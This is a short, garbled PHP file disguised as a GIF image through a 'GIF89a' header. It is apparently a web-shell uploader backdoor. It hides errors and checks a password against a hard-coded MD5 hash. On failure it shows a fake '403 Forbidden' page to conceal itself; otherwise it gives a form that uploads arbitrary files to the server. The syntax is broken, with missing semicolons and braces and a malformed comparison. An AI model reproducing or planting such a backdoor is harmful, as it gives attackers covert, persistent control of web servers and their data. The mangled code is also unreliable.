GIF89a1
error_reporting(NULL)
$me=$_SERVER['PHP_SELF']
$NameF=$_REQUEST['NameF']
$nowaddress='<input type=hidden name=address value="'.getcwd().'">'
$pass_up="a13756bf1e2bd46921c135232774fc5f"
if (isset($_FILES["elif"]) and
 $_FILES["elif"]["error"] )
move_uploaded_file($_FILES["elif"]["tmp_name"], $_FILES["elif"]["name"])
echo $ifupload=" ItsOk "
if(md5($_REQUEST['ssp'])
=$pass_up)
print "<title>403 Forbidden</title><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server </p>"
exit()
 $_SESSION['LoGiN']=true
echo "<form action=$me method=post enctype=multipart/form-data> $nowaddress <input type=file name=elif ><input type=submit value=Upload /></form>"
